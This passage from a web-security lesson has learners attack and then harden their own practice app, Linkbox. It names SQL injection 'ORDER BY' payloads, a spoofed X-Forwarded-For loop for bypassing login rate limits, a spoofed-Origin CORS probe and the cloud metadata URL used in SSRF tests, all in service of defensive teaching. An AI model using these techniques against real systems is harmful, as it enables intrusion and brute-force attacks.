console.log("1,000,000 SHA-256:", Math.round(performance.now() - t), "ms");

t = performance.now();
await argon2.hash("password", { type: argon2.argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1 });
console.log("1 argon2id:", Math.round(performance.now() - t), "ms");
```

On a laptop, a million SHA-256 hashes take about a second or two, while one Argon2id hash takes tens of milliseconds and 19 MiB of memory. Multiply that difference by an attacker's word list.

Inspect a real site's headers and CORS behaviour:

```bash
curl -sI https://github.com | grep -iE "strict-transport|content-security|x-content-type|referrer-policy"
curl -sI -H "Origin: https://evil.example" https://api.github.com | grep -i access-control
```

Break it on purpose:

1. In `sqli.mjs`, find the number of columns with `ORDER BY 4 --` payloads until one errors. That is how attackers size a UNION.
2. Change the parameterized query to build the `ILIKE` pattern with a template string again but keep `$1`. Which payloads work now? Partial parameterization is still injection.
3. After the build step, set `trustProxy: true` on Linkbox with a per-IP login limit only, and send ten bad logins with `curl -H "X-Forwarded-For: 10.0.0.$i"` in a loop. The limiter never fires, because each request claims a new IP. Then add the per-email key and try again.
4. Call `argon2.verify` with a hash made at `timeCost: 2`, then check `needsRehash` against `timeCost: 3`. This is how you migrate hashes without a password reset.

## Common mistakes

- **Checking login but not ownership.** Every query that takes an id from the client must also filter by the owner (`AND user_id = $2`). Write one test per route that requests another user's object and expects 404.
- **Interpolating "safe" values into SQL.** Column names, sort directions, numbers "already validated" and data read back from your own database all end up as injection one refactor later. Parameters for values, allow-lists for identifiers, no exceptions.
- **Hashing passwords with SHA-256 (even salted) or bcrypt with unchecked input length.** Use Argon2id with at least OWASP's minimum parameters, and store the full encoded string so you can raise them later.
- **JWTs in `localStorage` with no revocation plan.** One XSS bug steals every session, and logout does nothing. Use `HttpOnly` cookies, short expiry, and a server-side refresh token you can revoke; or just use sessions.
- **`Access-Control-Allow-Origin` reflected with credentials.** That turns CORS from a wall into an open door. Use an exact allow-list of origins.
- **Fetching user-supplied URLs with a plain `fetch()`.** It follows redirects, accepts any IP and has no size limit. Route outbound fetches of user URLs through one guarded function.

## Build: Linkbox, step 17

Audit Linkbox the way an attacker would, then fix what you find. Keep a short `SECURITY.md` checklist in the repo as you go.

1. **Injection.** Search the code for template strings and `+` inside `query(` calls: ``grep -rn 'query(`' src``. Every value goes through `$n`. The `sort` query parameter from lesson 08 maps through an allow-list to a column name.
2. **Passwords.** Switch the hash to Argon2id (`m=19456, t=2, p=1`) or raise scrypt to `N=2^17`. On successful login, rehash old-format hashes. Unknown email and wrong password return the same 401 and take the same time.
3. **Rate-limited login.** Register `@fastify/rate-limit` with the Redis client. Limit `POST /api/v1/sessions` per email (5 per 15 minutes) and per IP (a looser limit), set `trustProxy` correctly, and return 429 with `Retry-After`.
4. **BOLA checks.** Every bookmark, tag and attachment query includes `user_id`. Add one `node:test` test per route: user B requests user A's bookmark and gets 404.
5. **Mass assignment.** Every body schema has `additionalProperties: false` and lists only client-writable fields. Every response names its columns or has a response schema; `password_hash` never leaves the repository layer.
6. **Security headers.** Register `@fastify/helmet` with `contentSecurityPolicy: { directives: { defaultSrc: ["'none'"], frameAncestors: ["'none'"] } }`. Register `@fastify/cors` with an exact origin list from config (lesson 14).
7. **Sessions, cookie flags and CSRF.** Migrate sessions to store `sha256(token)` instead of the raw token: a migration that clears the `sessions` table (everyone logs in once more), then on login insert the hex SHA-256 of the new token as `sessions.id`, and on every request hash the `sid` cookie value before the lookup. The `sid` cookie gets `HttpOnly; Secure; SameSite=Lax; Path=/` and no `Domain`. (In a new app, the name `__Host-sid` would make the browser enforce those flags; Linkbox keeps `sid` so later lessons match.) Add the `Sec-Fetch-Site`/`Origin` hook from this lesson for unsafe methods, and confirm no route changes state on GET.
8. **SSRF protection in the metadata fetcher.** Put `assertPublicUrl` and `safeLookup` in `src/lib/ssrf.js` (lesson 25 reuses `assertPublicUrl` for webhook URLs). Replace the job's `fetch()` with a `fetchPage(url)` that calls `assertPublicUrl(url)` first, connects with `lookup: safeLookup`, does not follow redirects automatically (follow at most 3, each one through `assertPublicUrl` again), times out after 5 seconds and stops reading after 1 MB.
9. **Supply chain.** Commit `package-lock.json`, use `npm ci` in Docker and CI, and add `npm audit --omit=dev --audit-level=high` to CI (lesson 26). On npm 12 or newer, read the list of blocked install scripts after installing and approve only the packages that need one.

**Done when** a bookmark with URL `http://169.254.169.254/latest/meta-data/` is saved but never fetched (the job logs "blocked"), the `sessions` table holds only hashes, the BOLA tests pass, the sixth bad login in 15 minutes returns 429, and `curl -I` on any route shows the security headers.

## Check yourself

<details markdown="1">
<summary>Why does a parameterized query stop SQL injection, when escaping quotes often doesn't?</summary>

The SQL text is sent and parsed first (Parse), with `$1` as a typed slot. The values arrive afterwards (Bind) and are only ever treated as data, so nothing in them is parsed as SQL. Escaping tries to make untrusted text safe *inside* the parser, and has to get every context, encoding and edge case right every time.
</details>

<details markdown="1">
<summary>A route checks the session and then runs <code>SELECT * FROM bookmarks WHERE id = $1</code>. What is the bug, and does switching ids to UUIDs fix it?</summary>

BOLA (IDOR): any logged-in user can read any bookmark by changing the id. UUIDs only make ids harder to guess; they still leak through URLs and logs. The fix is the ownership check in the query, `AND user_id = $2`, returning 404 when it doesn't match.
</details>

<details markdown="1">
<summary>Why is a salted SHA-256 hash not good enough for passwords?</summary>

The salt stops precomputed tables and hides identical passwords, but SHA-256 is fast: attackers can test billions of guesses per second on GPUs. A password hash such as Argon2id is deliberately slow and memory-hard, so each guess costs real time and RAM.
</details>

<details markdown="1">
<summary>The session cookie is <code>SameSite=Lax</code>. Which request from evil.example still carries it, and why does that matter?</summary>

A top-level GET navigation, such as a link or `window.location` to your site. Lax allows it so links keep you logged in. That is why state-changing actions must never be reachable with GET.
</details>

<details markdown="1">
<summary>Your SSRF filter resolves the hostname, checks the IP, then calls <code>fetch(url)</code>. How can an attacker still reach 127.0.0.1?</summary>

DNS rebinding: their DNS server answers with a public IP for your check and with 127.0.0.1 for the second lookup `fetch` makes. Redirects to an internal address are another route. Validate the IP inside the connection's own lookup, and re-check every redirect.
</details>

<details markdown="1">
<summary>What does CORS protect against, and what does it not?</summary>

It controls which other origins' JavaScript in a *browser* may read your responses (and send certain requests). It does not authenticate anyone, does nothing for curl or server-to-server calls, and does not by itself stop CSRF form posts. Your authorization checks still run on every request.
</details>

## Go deeper

- [OWASP Top 10:2025](https://top10.owasp.org/2025/): the current list of web application risks, with causes, examples and prevention for each.
- [OWASP API Security Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/): BOLA, BFLA, property-level authorization and the other API-specific risks, with attack scenarios.
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/): short, current guides; start with Password Storage, SQL Injection Prevention, CSRF Prevention and SSRF Prevention.
- [PortSwigger Web Security Academy](https://portswigger.net/web-security): free interactive labs for SQL injection, XSS, CSRF, SSRF, JWT attacks and access control.
- [RFC 8725: JSON Web Token Best Current Practices](https://www.rfc-editor.org/rfc/rfc8725): the IETF's list of JWT attacks (including `none` and algorithm confusion) and how to avoid them.
- [NIST SP 800-63B](https://pages.nist.gov/800-63-4/sp800-63b.html): the source for modern password rules, session lifetimes and authenticator requirements.
